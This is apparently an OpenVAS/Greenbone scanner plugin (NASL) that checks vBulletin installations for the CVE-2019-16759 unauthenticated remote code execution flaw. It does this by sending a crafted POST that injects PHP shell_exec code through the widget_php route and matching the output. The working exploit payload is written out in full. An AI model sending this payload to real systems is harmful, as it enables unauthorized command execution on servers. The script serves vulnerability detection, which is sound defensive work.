# Copyright (C) 2019 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:vbulletin:vbulletin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.142932");
  script_version("2021-04-16T06:57:08+0000");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2019-09-25 04:05:17 +0000 (Wed, 25 Sep 2019)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2019-16759");

  script_tag(name:"qod_type", value:"exploit");

  script_name("vBulletin 5.x < 5.5.2 Patch Level 1, 5.5.3 < 5.5.3 Patch Level 1, 5.5.4 < 5.5.4 Patch Level 1 RCE Vulnerability");

  script_tag(name:"solution_type", value:"VendorFix");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2019 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("vbulletin_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("vbulletin/detected");

  script_tag(name:"summary", value:"vBulletin is prone to an unauthenticated remote code execution vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"impact", value:"An unauthenticated attacker may execute arbitrary code on the system as the
  user running vBulletin.");

  script_tag(name:"affected", value:"vBulletin versions 5.x before 5.5.2 Patch Level 1, 5.5.3 before 5.5.3 Patch Level 1
  and 5.5.4 before 5.5.4 Patch Level 1.");

  script_tag(name:"solution", value:"Update to 5.5.2 Patch Level 1, 5.5.3 Patch Level 1, 5.5.4 Patch Level 1 or later.
  Please see the referenced vendor advisory for more information.");

  script_xref(name:"URL", value:"https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4422707-vbulletin-security-patch-released-versions-5-5-2-5-5-3-and-5-5-4");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2019/Sep/31");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("list_array_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/";

headers = make_array("Content-Type", "application/x-www-form-urlencoded");
vt_strings = get_vt_strings();

cmds = exploit_commands();
foreach pattern(keys(cmds)) {
  cmd = cmds[pattern];
  final_checks[pattern] = "shell_exec%28%27" + cmd;
}

# nb: shell_exec might be disabled so use bin2hex in addition to it.
final_checks[vt_strings["default_rand_hex"]] = "bin2hex%28%27" + vt_strings["default_rand"];

foreach pattern(keys(final_checks)) {

  cmd = final_checks[pattern];
  data = "routestring=ajax%2Frender%2Fwidget_php&widgetConfig%5Bcode%5D=echo+" + cmd + "%27%29%3B+exit%3B";

  req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {

    info['1. "HTTP POST" body'] = data;
    info['2. URL'] = http_report_vuln_url( port:port, url:url, url_only:TRUE );
    info['3. Used command'] = cmd;
    info['4. Expected result'] = pattern;

    report  = 'By doing the following request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to execute a command on the target.';
    report += '\n\nResult: ' + res;
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
